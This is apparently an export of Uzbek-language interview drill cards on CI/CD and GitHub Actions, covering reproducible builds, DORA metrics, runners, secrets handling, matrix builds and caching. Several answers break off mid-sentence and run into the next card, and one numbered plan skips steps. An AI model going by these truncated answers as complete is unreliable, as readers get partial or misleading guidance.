Relizdan qo'rquvni esa tez va xavfsiz rollback (canary, flag) yo'qotadi.</p><p><b>Muammo:</b> 40 daqiqalik CI — dasturchi kutadi, kontekst almashtiradi, PR'larni kattalashtiradi (kamroq CI ishlatish uchun), katta PR'lar ko'proq xato -&gt; reliz qo'rquvi. Bu o'z-o'zini kuchaytiruvchi tsikl.</p><p><b>Qanday ishlaydi (reja):</b></p><pre>1. O'lcha:   har job/step vaqti (CI insights), eng sekin testlar<br>2. Piramida: e2e'larni integration (testcontainers) ga tushirish<br>5. Scope:    monorepo -&gt; faqat o'zgargan modullar<br>6. Flaky:    karantin + ticket, retry bilan yashirmaslik<br>7. Bosqich:  PR = tez to'plam; merge/tungi = to'liq<br>8. Reliz:    canary + avtomatik rollback -&gt; qo'rquv kamayadi</pre><p><b>Amalda:</b></p><pre>go test -json ./... | gotestsum --jsonfile t.json --format pkgname<br>gotestsum tool slowest --jsonfile t.json --threshold 2s     # eng sekin testlar</pre><pre>strategy:<br>  matrix: { shard: [0, 1, 2, 3] }<br>steps:<br>  - run: |<br>      go test $(go list ./... | awk &quot;NR % 4 == ${{ matrix.shard }}&quot;) -p 8</pre><p><b>Tuzoqlar:</b></p><ul><li>O'lchamasdan &quot;kattaroq runner&quot; sotib olish — muammo kesh yoki bitta sekin test bo'lishi mumkin.</li><li>E2e testlarni o'chirib tezlashtirish — ishonch yo'qoladi, qo'rquv oshadi.</li><li>Flaky'larni <code>retry: 3</code> bilan yashirish.</li><li>PR va merge to'plamini ajratib, merge'dan keyingi xatolarni hech kim kuzatmasligi.</li></ul><p><b>Senior nuqta:</b> Maqsadni raqam bilan qo'y (PR CI p50 &lt; 10 daq) va DORA metrikalari (lead time, change failure rate) bilan natijani ko'rsat. Reliz qo'rquvi texnik emas, ishonch muammosi: kichik, tez-tez, qaytariladigan relizlar uni yo'qotadi.</p>	lvl::Staff dom::cicd sec::i2 CI_CD
Interview Drill::CI/CD::I2 CI/CD & deploy	idrill-30477	<p>Build reproducibility (takrorlanuvchanlik) nega muhim?</p>	<p><b>Qisqa javob:</b> Reproducible build — <b>bir xil manba va muhitdan bit-ga-bit bir xil artefakt</b> chiqishi. Natijada &quot;bu binary qaysi kod'dan?&quot; degan savolga javob yo'q, va buzilgan build server (SolarWinds kabi) zararli kodni sezdirmasdan qo'shishi mumkin.</p><p><b>Qanday ishlaydi:</b></p><pre>Kirish (hammasi pin):              Chiqish:<br> git commit SHA                     image@sha256:X<br> go.sum / lockfile (checksum)  --&gt;  build #1 -&gt; X<br> base image @digest                 build #2 -&gt; X  (mustaqil) =&gt; ishonch<br> toolchain versiyasi                farq bo'lsa -&gt; tergov<br> build flag'lar (-trimpath)<br> SOURCE_DATE_EPOCH (vaqt)</pre><p><b>Amalda (Go + Docker):</b></p><pre>FROM golang:1.25@sha256:&lt;digest&gt; AS build<br>WORKDIR /src<br>COPY go.mod go.sum ./<br>RUN go mod download &amp;&amp; go mod verify<br>COPY . .<br>RUN CGO_ENABLED=0 go build -trimpath -buildvcs=true -ldflags=&quot;-s -w -buildid=&quot; -o /app ./cmd/api<br><br>FROM gcr.io/distroless/static@sha256:&lt;digest&gt;<br>COPY --from=build /app /app<br>ENTRYPOINT [&quot;/app&quot;]</pre><pre>SOURCE_DATE_EPOCH=$(git log -1 --format=%ct) docker buildx build --output type=oci,dest=a.tar,rewrite-timestamp=true .<br>go version -m ./app        # binary ichidagi modul versiyalari va vcs.revision</pre><p><b>Tuzoqlar:</b></p><ul><li>Base image tag bilan (<code>golang:1.25</code>) — vaqt o'tib boshqa image.</li><li>Build vaqtini binary'ga yozish (<code>-X main.buildTime=$(date)</code>) — har build farqli.</li><li><code>go mod download</code> proxy'siz — upstream o'zgarsa yoki yo'qolsa build sinadi.</li><li><code>apt-get install</code> versiyasiz — har build boshqa paket.</li></ul><p><b>Senior nuqta:</b> To'liq bit-ga-bit reproducibility qiyin; amaliy maqsad — SLSA provenance (qayerda, nimadan qurilgan) + imzo + SBOM. Interview Drill::CI/CD::I2 CI/CD & deploy	idrill-42237	<p>Senariy: production deploy'dan keyin 5xx o'sdi. Interview Drill::CI/CD::I2 CI/CD & deploy	idrill-42239	<p>DORA metrikalari nima va ularni jamoani yaxshilash uchun qanday ishlatasiz (va ishlatmaysiz)?</p>	<p><b>Qisqa javob:</b> DORA'ning to'rtta asosiy metrikasi: <b>Deployment frequency</b> (prod'ga qanchalik tez-tez), <b>Lead time for changes</b> (commit -&gt; prod), <b>Change failure rate</b> (deploy'larning necha foizi incident/rollback beradi), <b>Time to restore</b> (incident -&gt; tiklanish; 2023+ da &quot;failed deployment recovery time&quot; deb ham ataladi). Birinchi ikkitasi — tezlik, oxirgi ikkitasi — barqarorlik. Ular jamoa <b>o'z jarayonidagi to'siqlarni</b> topishi uchun, jamoalarni reyting qilish uchun emas.</p><p><b>Muammo:</b> &quot;Biz tezmizmi?&quot; — hissiyot bilan javob beriladi. DORA tezlik va barqarorlikni o'lchanadigan qiladi va ular bir-biriga zid emasligini ko'rsatadi: kichik, tez-tez deploy'lar odatda failure rate'ni ham kamaytiradi.</p><p><b>Qanday ishlaydi:</b></p><pre>Ma'lumot manbalari:<br> Git (commit vaqti) + CI/CD (deploy vaqti) -&gt; lead time, deploy frequency<br> Incident tizimi (PagerDuty) + rollback'lar -&gt; change failure rate, time to restore<br><br>Lead time tahlili (misol):<br> commit -&gt; PR ochildi  2s<br> PR -&gt; birinchi review 18s   &lt;- to'siq (70%)<br> review -&gt; merge       3s<br> merge -&gt; prod         1s</pre><p>| Metrika | Nima | Yuqori natija | |---|---|---| | Deployment frequency | prod'ga deploy chastotasi | kuniga bir necha | | Lead time for changes | commit -&gt; prod | &lt; 1 kun | | Change failure rate | incident beradigan deploy % | ~0-15% | | Time to restore | incident -&gt; tiklanish | &lt; 1 soat |</p><p><b>Amalda (o'lchash):</b></p><pre># deploy chastotasi: GitHub deployments API<br>gh api repos/acme/api/deployments --paginate -q '.[] | select(.environment==&quot;prod&quot;) | .created_at' | cut -c1-10 | sort | uniq -c</pre><p>Vositalar: Four Keys (Google), Sleuth, LinearB, GitLab/GitHub o'rnatilgan DORA dashboard'lari.</p><p><b>To'g'ri ishlatish:</b> trend kuzatish (o'z-o'zi bilan solishtirish), to'siqni topib eksperiment qilish (masalan, review SLA), retrospektivada muhokama.</p><p><b>Noto'g'ri ishlatish:</b></p><ul><li>&quot;Deploy sonini oshiring&quot; maqsadi — ma'nosiz mayda deploy'lar (Goodhart qonuni).</li><li>Jamoalarni reyting qilish — ma'lumot manipulyatsiyasi, &quot;incident&quot; ta'rifini toraytirish.</li><li>Individual performance o'lchovi sifatida.</li><li>Kontekstni hisobga olmaslik (mobil ilova va backend servis turlicha).</li></ul><p><b>Senior nuqta:</b> Metrika — savol berish uchun, javob emas. DORA tadqiqotlari (2024-2025) qo'shimcha ravishda reliability va developer experience'ni ham o'lchashni tavsiya qiladi; faqat to'rt raqamga qarash noto'liq rasm beradi.</p>	lvl::Staff dom::cicd sec::i2 CI_CD
Interview Drill::CI/CD::I8 GitHub Actions	idrill-32000	<p>GitHub Actions'da workflow, job, step va action nima?</p>	<p><b>Qisqa javob:</b> Workflow — <code>.github/workflows/*.yml</code> faylidagi avtomatlashtirish, <code>on:</code> dagi event bilan ishga tushadi. Job — bitta runner (VM yoki konteyner) da bajariladigan qadamlar to'plami; job'lar default parallel. Step — job ichidagi ketma-ket qadam: <code>run:</code> (shell buyruq) yoki <code>uses:</code> (action). Action — qayta ishlatiladigan tayyor blok (<code>actions/checkout@v4</code>).</p><p><b>Ierarxiya:</b></p><pre>Workflow (ci.yml)  &lt;- on: push<br>  +-- Job: lint   (runner 1)  --+<br>  |     step: checkout          |  parallel<br>  |     step: golangci-lint     |<br>  +-- Job: test   (runner 2)  --+<br>  |     step: checkout<br>  |     step: go test<br>  +-- Job: deploy (runner 3)  needs: [lint, test]</pre><p><b>Amalda:</b></p><pre>name: CI<br>on: [push]<br>jobs:<br>  test:<br>    runs-on: ubuntu-latest<br>    steps:<br>      - uses: actions/checkout@v4          # action<br>      - uses: actions/setup-go@v5<br>        with: {go-version: '1.23'}<br>      - run: go test ./...                  # shell step</pre><p><b>Action turlari:</b> JavaScript (Node), Docker konteyner, composite (bir nechta step'ni birlashtiradi). Marketplace'da minglab tayyor action bor.</p><p><b>Muhim farq:</b></p><ul><li>Step'lar bitta job ichida umumiy workspace va fayl tizimini bo'lishadi.</li><li>Job'lar alohida mashinada — fayllar avtomatik o'tmaydi; artifact, cache yoki output orqali uzatiladi.</li></ul><p><b>Tuzoqlar:</b></p><ul><li><code>build</code> job'ida yasalgan binary'ni <code>deploy</code> job'ida topmoqchi bo'lish — u yo'q (artifact kerak).</li><li><code>actions/checkout</code> ni unutish — runner'da kod yo'q.</li><li>Har narsani bitta katta job'ga yig'ish — parallellik yo'qoladi.</li></ul><p><b>Senior nuqta:</b> Job chegarasini izolyatsiya va parallellik bo'yicha chiz: secret talab qiladigan deploy alohida job (environment bilan), testlar parallel job'larda.</p>	lvl::Junior dom::cicd sec::i8 GitHub_Actions
Interview Drill::CI/CD::I8 GitHub Actions	idrill-32001	<p>Workflow qaysi event'lar bilan ishga tushadi?</p>	<p><b>Qisqa javob:</b> Workflow <code>on:</code> kalitidagi event'lar bilan ishga tushadi. Eng ko'p ishlatiladiganlari: <code>push</code>, <code>pull_request</code>, <code>schedule</code> (cron), <code>workflow_dispatch</code> (qo'lda, input'lar bilan), <code>workflow_call</code> (boshqa workflow'dan chaqirish), <code>release</code>, <code>merge_group</code>. Har biriga branch, tag va path filter qo'shish mumkin.</p><p><b>Amalda:</b></p><pre>on:<br>  push:<br>    branches: [main]<br>    tags: ['v*']<br>    paths: ['src/**', 'go.mod']<br>  pull_request:<br>    branches: [main]<br>    paths-ignore: ['docs/**', '**.md']<br>  schedule:<br>    - cron: '0 3 * * *'        # har kuni 03:00 UTC<br>  workflow_dispatch:<br>    inputs:<br>      env:<br>        type: choice<br>        options: [stg, prod]<br>        default: stg</pre><p>Input'ni ishlatish: <code>${{ inputs.env }}</code>. CLI'dan: <code>gh workflow run deploy.yml -f env=prod</code>.</p><p><b>Event'lar va qachon:</b></p><p>| Event | Qachon | |---|---| | <code>push</code> | branch/tag'ga push — CI, release | | <code>pull_request</code> | PR ochildi/yangilandi — tekshiruv | | <code>schedule</code> | tungi skan, dependency check | | <code>workflow_dispatch</code> | qo'lda deploy, rollback | | <code>workflow_call</code> | reusable workflow | | <code>workflow_run</code> | boshqa workflow tugagach | | <code>merge_group</code> | merge queue |</p><p><b>Tuzoqlar:</b></p><ul><li><code>schedule</code> faqat default branch'dagi workflow faylidan ishlaydi, vaqt UTC, yuk paytida 10-30 daqiqa kechikishi mumkin; 60 kun faollik bo'lmagan public repo'da avtomatik o'chiriladi.</li><li><code>paths</code> filter bilan required check: PR'da fayl mos kelmasa check umuman ishlamaydi va merge bloklanadi — required check uchun ehtiyot bo'l.</li><li><code>push</code> va <code>pull_request</code> ikkalasi bo'lsa — PR branch'ida har commit uchun ikki marta ishlaydi.</li></ul><p><b>Senior nuqta:</b> Monorepo'da <code>paths</code> filter xarajatni keskin kamaytiradi, lekin umumiy kod (<code>pkg/</code>, <code>go.mod</code>) o'zgarganda hamma narsa build bo'lishini unutma.</p>	lvl::Junior dom::cicd sec::i8 GitHub_Actions
Interview Drill::CI/CD::I8 GitHub Actions	idrill-32002	<p><code>runs-on</code> nima? GitHub-hosted va self-hosted runner farqi?</p>	<p><b>Qisqa javob:</b> <code>runs-on</code> job qaysi mashinada (runner) bajarilishini belgilaydi. GitHub-hosted runner — GitHub boshqaradigan, har job uchun toza VM (<code>ubuntu-latest</code>, <code>windows-latest</code>, <code>macos-latest</code>), daqiqa bo'yicha to'lanadi. Self-hosted runner — o'zing boshqaradigan mashina: private tarmoqqa kira oladi, maxsus hardware, lekin xavfsizlik va texnik xizmat seniki.</p><p><b>Taqqoslash:</b></p><p>| | GitHub-hosted | Self-hosted | |---|---|---| | Muhit | har job toza VM | o'zing sozlaysan, state qolishi mumkin | | Narx | daqiqa bo'yicha (private repo) | o'z infra + ops vaqti | | Tarmoq | public internet | private resurslar (DB, ichki registry) | | Hardware | standart, larger runners (pullik) | GPU, ARM, katta RAM | | Xavfsizlik | izolyatsiya GitHub'da | sening javobgarliging |</p><p><b>Amalda:</b></p><pre>jobs:<br>  test:<br>    runs-on: ubuntu-24.04            # aniq versiya - barqaror<br>  gpu:<br>    runs-on: [self-hosted, linux, gpu]   # label'lar bo'yicha<br>  build:<br>    runs-on: arc-runner-set          # Kubernetes ARC scale set</pre><p><b>Xavf:</b> Public repo'da self-hosted runner — har kim fork qilib PR ochadi, PR'dagi kod sening mashinangda ishlaydi (RCE): ichki tarmoqqa kiradi, keyingi job'lar uchun backdoor qoldiradi.</p><p><b>To'g'ri self-hosted:</b></p><ul><li>Faqat private repo'lar, runner group + repo allowlist.</li><li>Ephemeral: har job yangi VM/pod (ARC, <code>--ephemeral</code> flag) — state qolmaydi.</li><li>Minimal huquqlar, cloud'ga OIDC orqali, node rolidan emas.</li></ul><p><b>Tuzoqlar:</b></p><ul><li><code>ubuntu-latest</code> vaqti-vaqti bilan yangi versiyaga o'tadi — build kutilmaganda buziladi; aniq versiya pin qil.</li><li>Persistent self-hosted runner'da oldingi job'ning fayllari/secret'lari qoladi.</li><li>macOS runner daqiqasi Linux'dan ~10x qimmat.</li></ul><p><b>Senior nuqta:</b> Self-hosted &quot;arzon&quot; ko'rinadi, lekin patch, autoscaling, xavfsizlik ops vaqtini hisobla. Ko'pincha GitHub larger runners yoki ARC + spot node'lar yaxshi muvozanat.</p>	lvl::Junior dom::cicd sec::i8 GitHub_Actions
Interview Drill::CI/CD::I8 GitHub Actions	idrill-32003	<p>Secret qanday saqlanadi va ishlatiladi?</p>	<p><b>Qisqa javob:</b> Secret'lar GitHub sozlamalarida shifrlangan holda saqlanadi (repository, environment yoki organization darajasida) va workflow'da <code>${{ secrets.NAME }}</code> orqali olinadi. Logda avtomatik <code>***</code> bilan yashiriladi. Ularni <code>run:</code> ichiga to'g'ridan-to'g'ri emas, <code>env:</code> orqali berish kerak.</p><p><b>Darajalar:</b></p><pre>Organization secret  -&gt; tanlangan repo'larga<br>Repository secret    -&gt; shu repo'ning barcha workflow'lari<br>Environment secret   -&gt; faqat `environment: production` job'iga,<br>                        protection rule (approval) o'tgandan keyin</pre><p><b>Amalda:</b></p><pre>gh secret set DEPLOY_TOKEN --body &quot;$TOKEN&quot;                  # repo<br>gh secret set DB_PASSWORD --env production &lt; pass.txt       # environment</pre><pre>jobs:<br>  deploy:<br>    environment: production<br>    steps:<br>      - run: ./deploy.sh<br>        env:<br>          TOKEN: ${{ secrets.DEPLOY_TOKEN }}</pre><p><b>Masking qanday ishlaydi:</b> runner log'da aniq secret qiymatini qidirib <code>***</code> ga almashtiradi. Shuning uchun:</p><ul><li>base64 qilingan, bo'lingan yoki o'zgartirilgan qiymat yashirilmaydi;</li><li>JSON secret ichidagi alohida maydonlar yashirilmaydi — ularni <code>echo &quot;::add-mask::$VALUE&quot;</code> bilan qo'shimcha mask qil.</li></ul><p><b>Tuzoqlar:</b></p><ul><li><code>run: curl -H &quot;Authorization: ${{ secrets.TOKEN }}&quot;</code> — ishlaydi, lekin expression shell'dan oldin almashtiriladi; <code>env:</code> orqali ber (injection va tasodifiy chiqishdan himoya).</li><li>Fork'dan kelgan <code>pull_request</code> da secret'lar berilmaydi — testlar fail bo'ladi; buni <code>pull_request_target</code> bilan &quot;tuzatish&quot; xavfli.</li><li><code>set -x</code> yoki debug log — secret o'zgartirilgan shaklda chiqib ketadi.</li><li>Cloud kalitlarini secret sifatida saqlash — OIDC bilan umuman kerak emas.</li></ul><p><b>Senior nuqta:</b> Eng yaxshi secret — yo'q secret: cloud uchun OIDC, GitHub API uchun GitHub App qisqa muddatli tokeni. Qolganlarini environment darajasida va approval bilan chekla.</p>	lvl::Junior dom::cicd sec::i8 GitHub_Actions
Interview Drill::CI/CD::I8 GitHub Actions	idrill-32004	<p><code>needs</code> nima uchun kerak?</p>	<p><b>Qisqa javob:</b> <code>needs</code> job'lar orasida bog'liqlik o'rnatadi: job faqat ko'rsatilgan job'lar muvaffaqiyatli tugagandan keyin boshlanadi. <code>needs</code> bo'lmasa, barcha job'lar parallel ishlaydi. Shu bilan DAG (yo'naltirilgan graf) quriladi va oldingi job output'larini olish mumkin bo'ladi.</p><p><b>Qanday ishlaydi:</b></p><pre>lint ----+<br>         +--&gt; build --&gt; deploy-stg --&gt; deploy-prod<br>test ----+</pre><pre>jobs:<br>  lint:  {runs-on: ubuntu-latest, steps: [...]}<br>  test:  {runs-on: ubuntu-latest, steps: [...]}<br>  build:<br>    needs: [lint, test]<br>    runs-on: ubuntu-latest<br>    steps: [...]<br>  deploy:<br>    needs: build<br>    if: github.ref == 'refs/heads/main'<br>    runs-on: ubuntu-latest<br>    steps:<br>      - run: echo &quot;image=${{ needs.build.outputs.image }}&quot;</pre><p><b>Fail bo'lganda:</b></p><ul><li>Default: <code>needs</code> dagi job fail bo'lsa — keyingisi <b>skip</b> qilinadi.</li><li>O'zgartirish: <code>if: always()</code> (har doim), <code>if: failure()</code> (faqat fail'da, masalan xabarnoma), <code>if: ${{ !cancelled() }}</code>.</li></ul><pre>notify:<br>  needs: [build, deploy]<br>  if: failure()<br>  runs-on: ubuntu-latest<br>  steps:<br>    - run: ./slack-notify.sh &quot;Pipeline yiqildi&quot;</pre><p><b>Tuzoqlar:</b></p><ul><li><code>if: always()</code> bilan deploy — build fail bo'lsa ham deploy urinadi; holatni aniq tekshir: <code>needs.build.result == 'success'</code>.</li><li>Keraksiz <code>needs</code> zanjiri — hamma narsa ketma-ket, pipeline sekin.</li><li>Skip qilingan job required check sifatida &quot;success&quot; hisoblanadi — branch protection'da adashtirishi mumkin.</li></ul><p><b>Senior nuqta:</b> Critical path'ni qisqartir: mustaqil narsalar (lint, unit test, security scan) parallel, faqat haqiqiy bog'liqlik <code>needs</code> bilan.</p>	lvl::Junior dom::cicd sec::i8 GitHub_Actions
Interview Drill::CI/CD::I8 GitHub Actions	idrill-33023	<p><code>if:</code> sharti va status funksiyalari (<code>success()</code>, <code>failure()</code>, <code>always()</code>, <code>cancelled()</code>) qanday ishlaydi?</p>	<p><b>Qisqa javob:</b> <code>if:</code> step yoki job bajarilishi shartini belgilaydi. Status funksiyalari oldingi qadamlar holatiga qaraydi: <code>success()</code> — hammasi muvaffaqiyatli (default, <code>if</code> yozilmasa shu), <code>failure()</code> — oldingi biror qadam fail bo'lgan, <code>always()</code> — har qanday holatda (hatto bekor qilinganda), <code>cancelled()</code> — run bekor qilingan.</p><p><b>Qanday ishlaydi:</b></p><pre>step1 ok -&gt; step2 FAIL -&gt; step3 (default success()) SKIP<br>                       -&gt; step4 if: failure()       BAJARILADI<br>                       -&gt; step5 if: always()        BAJARILADI<br>                       -&gt; step6 if: !cancelled()    BAJARILADI (bekor qilinmagan)</pre><p><b>Amalda:</b></p><pre>steps:<br>  - run: make test<br>  - name: Slack'ga xabar<br>    if: failure()<br>    run: ./notify-slack.sh<br>  - name: Loglarni saqlash<br>    if: ${{ !cancelled() }}<br>    uses: actions/upload-artifact@v4<br>    with: {name: logs, path: logs/}<br>  - name: Release<br>    if: github.event_name == 'push' &amp;&amp; startsWith(github.ref, 'refs/tags/v')<br>    run: ./release.sh<br>  - name: Faqat ma'lum step fail bo'lganda<br>    if: failure() &amp;&amp; steps.migrate.outcome == 'failure'<br>    run: ./rollback-db.sh</pre><p><b>Ifoda qoidalari:</b></p><ul><li>Status funksiyasi yozilmasa, GitHub avtomatik <code>success() &amp;&amp;</code> qo'shadi. Shuning uchun <code>if: github.ref == 'refs/heads/main'</code> faqat oldingilar ok bo'lsa ishlaydi.</li><li><code>steps.&lt;id&gt;.outcome</code> — <code>continue-on-error</code> dan oldingi natija, <code>conclusion</code> — keyingi.</li></ul><p><b>Tuzoqlar:</b></p><ul><li><code>always()</code> foydalanuvchi run'ni bekor qilganda ham ishlaydi — uzoq cleanup bekor qilishni sekinlashtiradi; ko'pincha <code>!cancelled()</code> to'g'riroq.</li><li><code>if: ${{ secrets.X != '' }}</code> — secret'lar <code>if</code> da to'g'ridan-to'g'ri ishlatilmaydi; avval <code>env</code> ga o'tkaz.</li><li><code>if:</code> da <code>${{ }}</code> ni <code>!</code> bilan boshlash — YAML'da <code>!</code> tag; <code>${{ !cancelled() }}</code> shaklida yoz.</li></ul><p><b>Senior nuqta:</b> Cleanup (test DB o'chirish, lock bo'shatish) uchun <code>!cancelled()</code> yoki <code>always()</code> ni aniq tanla va uni idempotent qil — u har qanday holatda ishga tushishi mumkin.</p>	lvl::Junior dom::cicd sec::i8 GitHub_Actions
Interview Drill::CI/CD::I8 GitHub Actions	idrill-33024	<p><code>env</code>, <code>vars</code> va <code>secrets</code> farqi?</p>	<p><b>Qisqa javob:</b> <code>env</code> — workflow/job/step darajasidagi muhit o'zgaruvchilari, YAML ichida yoziladi. <code>vars</code> — GitHub sozlamalarida saqlanadigan <b>maxfiy bo'lmagan</b> konfiguratsiya (region, URL), logda ochiq ko'rinadi. <code>secrets</code> — shifrlangan maxfiy qiymatlar (token, parol), logda yashiriladi.</p><p><b>Taqqoslash:</b></p><p>| | <code>env</code> | <code>vars</code> | <code>secrets</code> | |---|---|---|---| | Qayerda | workflow faylida | Settings (repo/env/org) | Settings (shifrlangan) | | Logda | ochiq | ochiq | <code>***</code> | | Misol | <code>APP=billing</code> | <code>REGION=eu-central-1</code> | <code>DEPLOY_TOKEN</code> | | Fork PR'da | bor | bor | yo'q |</p><p><b>Amalda:</b></p><pre>env:                       # workflow darajasi<br>  APP: billing<br>jobs:<br>  deploy:<br>    environment: production<br>    env:                   # job darajasi<br>      LOG_LEVEL: info<br>    steps:<br>      - run: ./deploy.sh --app &quot;$APP&quot; &quot;$GITHUB_OUTPUT&quot;</pre><p><b>Muhim:</b></p><ul><li><code>GITHUB_ENV</code> ga yozilgan qiymat shu step'da emas, <b>keyingi</b> step'lardan ko'rinadi.</li><li>Step output faqat <code>id</code> bergan step uchun.</li><li>Job'lar orasida — <code>jobs.&lt;id&gt;.outputs</code> orqali (alohida mexanizm).</li></ul><p><b>Tuzoqlar:</b></p><ul><li>Eski <code>::set-output</code> va <code>::set-env</code> buyruqlari deprecated (xavfsizlik sabab) — ishlatma.</li><li>Untrusted qiymatni (PR title) <code>GITHUB_ENV</code> ga yozish — <code>NODE_OPTIONS</code> yoki <code>LD_PRELOAD</code> kabi o'zgaruvchi orqali kod ijrosi; Interview Drill::CI/CD::I8 GitHub Actions	idrill-33026	<p>Actions'da Docker image build qilib registry'ga (GHCR) push qilish qanday?</p>	<p><b>Qisqa javob:</b> <code>docker/login-action</code> bilan GHCR'ga <code>GITHUB_TOKEN</code> orqali kirish, <code>docker/setup-buildx-action</code> bilan BuildKit, <code>docker/build-push-action</code> bilan build va push. Workflow'ga <code>packages: write</code> ruxsati kerak. Tag sifatida commit SHA (va semver) ishlatiladi, <code>latest</code> emas; GHA cache bilan build tezlashadi.</p><p><b>Amalda:</b></p><pre>name: image<br>on:<br>  push: {branches: [main], tags: ['v*']}<br>  pull_request:<br>permissions:<br>  contents: read<br>  packages: write<br>jobs:<br>  build:<br>    runs-on: ubuntu-latest<br>    steps:<br>      - uses: actions/checkout@v4<br>      - uses: docker/setup-buildx-action@v3<br>      - uses: docker/login-action@v3<br>        if: github.event_name != 'pull_request'<br>        with:<br>          registry: ghcr.io<br>          username: ${{ github.actor }}<br>          password: ${{ secrets.GITHUB_TOKEN }}<br>      - id: meta<br>        uses: docker/metadata-action@v5<br>        with:<br>          images: ghcr.io/${{ github.repository }}<br>          tags: |<br>            type=sha<br>            type=semver,pattern={{version}}<br>      - uses: docker/build-push-action@v6<br>        with:<br>          push: ${{ github.event_name != 'pull_request' }}<br>          tags: ${{ steps.meta.outputs.tags }}<br>          labels: ${{ steps.meta.outputs.labels }}<br>          cache-from: type=gha<br>          cache-to: type=gha,mode=max<br>          platforms: linux/amd64,linux/arm64</pre><p><b>Nega SHA tag:</b> <code>latest</code> qaysi kod ekanini bildirmaydi va o'zgarib turadi — rollback va audit qiyin. Eng ishonchlisi — deploy'da digest (<code>@sha256:...</code>).</p><p><b>Tuzoqlar:</b></p><ul><li>PR'da push qilish — fork PR'larda token read-only, xato beradi; PR'da faqat build.</li><li><code>permissions</code> ko'rsatilmasa va org default read-only bo'lsa — <code>denied: permission_denied</code>.</li><li><code>mode=max</code> cache katta — 10 GB repo cache limitini to'ldiradi va eski cache'lar o'chadi.</li><li>Multi-arch build QEMU bilan sekin — <code>docker/setup-qemu-action</code> yoki native ARM runner.</li></ul><p><b>Senior nuqta:</b> Image'ga provenance va SBOM qo'sh (<code>provenance: true</code>, <code>sbom: true</code> yoki <code>actions/attest-build-provenance</code>) va cluster'da faqat imzolangan/attest qilingan image'larni qabul qil.</p>	lvl::Junior dom::cicd sec::i8 GitHub_Actions
Interview Drill::CI/CD::I8 GitHub Actions	idrill-32005	<p>Matrix strategy qanday ishlaydi?</p>	<p><b>Qisqa javob:</b> Matrix strategy bitta job ta'rifidan bir nechta job nusxasini yaratadi — har kombinatsiya (masalan Go versiyasi x OS) uchun alohida, parallel job. <code>include</code>/<code>exclude</code> bilan kombinatsiyalarni qo'shish/olib tashlash, <code>fail-fast</code> va <code>max-parallel</code> bilan xatti-harakatni boshqarish mumkin.</p><p><b>Qanday ishlaydi:</b></p><pre>matrix: go [1.22, 1.23] x os [ubuntu, macos]<br>  -&gt; test (1.22, ubuntu)<br>  -&gt; test (1.23, ubuntu)<br>  -&gt; test (1.23, macos)<br>  (1.22, macos) exclude qilingan</pre><p><b>Amalda:</b></p><pre>jobs:<br>  test:<br>    runs-on: ${{ matrix.os }}<br>    strategy:<br>      fail-fast: false<br>      max-parallel: 4<br>      matrix:<br>        go: ['1.22', '1.23']<br>        os: [ubuntu-latest, macos-latest]<br>        exclude:<br>          - {go: '1.22', os: macos-latest}<br>        include:<br>          - {go: '1.23', os: ubuntu-latest, race: true}<br>    steps:<br>      - uses: actions/checkout@v4<br>      - uses: actions/setup-go@v5<br>        with: {go-version: '${{ matrix.go }}'}<br>      - run: go test ${{ matrix.race &amp;&amp; '-race' || '' }} ./...</pre><p>Test sharding:</p><pre>matrix: {shard: [1, 2, 3, 4]}<br># run: ./run-tests.sh --shard ${{ matrix.shard }}/4</pre><p><b>Sozlamalar:</b></p><ul><li><code>fail-fast: true</code> (default) — bitta job fail bo'lsa, qolganlari bekor qilinadi. Tez feedback, lekin qaysi kombinatsiyalar buzilganini to'liq ko'rmaysan.</li><li><code>max-parallel</code> — bir vaqtda nechta (runner yoki tashqi resurs limiti uchun).</li><li>Limit: bitta matrix'da 256 job.</li></ul><p><b>Tuzoqlar:</b></p><ul><li>Branch protection'da matrix job nomlari (<code>test (1.23, ubuntu-latest)</code>) required qilinadi — matrix o'zgarsa required check &quot;kutilmoqda&quot; holatida qotadi. Yakuniy &quot;gate&quot; job qo'yib, faqat uni required qil.</li><li>Kombinatsiyalar portlashi (5x4x3 = 60 job) — daqiqa xarajati.</li><li><code>fail-fast: true</code> flaky testni boshqa kombinatsiyalarni bekor qilib yashiradi.</li></ul><p><b>Senior nuqta:</b> Matrix'ni haqiqiy qo'llab-quvvatlash matritsasi bilan chekla (rasmiy qo'llab-quvvatlanadigan versiyalar), qolganlarini tungi <code>schedule</code> ga o'tkaz.</p>	lvl::Middle dom::cicd sec::i8 GitHub_Actions
Interview Drill::CI/CD::I8 GitHub Actions	idrill-32006	<p>Cache va artifact farqi nima?</p>	<p><b>Qisqa javob:</b> Cache — tezlik uchun: dependency'lar va build natijalarini run'lar orasida qayta ishlatish (<code>go mod</code>, <code>node_modules</code>); yo'qolishi mumkin va bunga tayyor bo'lish kerak. Artifact — natija: build qilingan fayl, test hisoboti, log; aniq run'ga tegishli, retention muddati davomida kafolatlangan va job'lar orasida yoki yuklab olish uchun uzatiladi.</p><p><b>Taqqoslash:</b></p><p>| | Cache | Artifact | |---|---|---| | Maqsad | tezlashtirish | natijani saqlash/uzatish | | Kafolat | yo'q (evict bo'lishi mumkin) | retention davomida bor (default 90 kun) | | Kalit | <code>key</code> (fayl hash'i) | <code>name</code> | | Scope | branch + default branch'dan o'qish | bitta run (va API orqali) | | Limit | repo'ga 10 GB, 7 kun ishlatilmasa o'chadi | storage kvotasi |</p><p><b>Amalda:</b></p><pre>- uses: actions/cache@v4<br>  with:<br>    path: |<br>      ~/go/pkg/mod<br>      ~/.cache/go-build<br>    key: go-${{ runner.os }}-${{ hashFiles('**/go.sum') }}<br>    restore-keys: go-${{ runner.os }}-<br>- run: go build -o dist/app ./cmd/app<br>- uses: actions/upload-artifact@v4<br>  with:<br>    name: app-bin<br>    path: dist/<br>    retention-days: 7</pre><p>Keyingi job'da:</p><pre>- uses: actions/download-artifact@v4<br>  with: {name: app-bin, path: dist/}</pre><p>Ko'p setup action'larda cache o'rnatilgan: <code>actions/setup-go</code> (<code>cache: true</code> default), <code>setup-node</code> (<code>cache: npm</code>).</p><p><b>Cache kalit mantiqi:</b></p><pre>key exact hit   -&gt; to'liq cache tiklanadi, oxirida saqlanmaydi<br>restore-keys    -&gt; eng yaqin prefiks tiklanadi, oxirida yangi key bilan saqlanadi<br>miss            -&gt; noldan, oxirida saqlanadi</pre><p><b>Tuzoqlar:</b></p><ul><li>Cache'ga ishonib correctness qurish — cache miss bo'lsa build ishlamaydi.</li><li>PR branch'idagi cache boshqa PR'larga ko'rinmaydi (izolyatsiya) — main'da cache &quot;isitish&quot; kerak.</li><li>Artifact'ni cache o'rnida ishlatish (yoki aksincha) — sekin yoki ishonchsiz.</li><li>Artifact v4 da bir 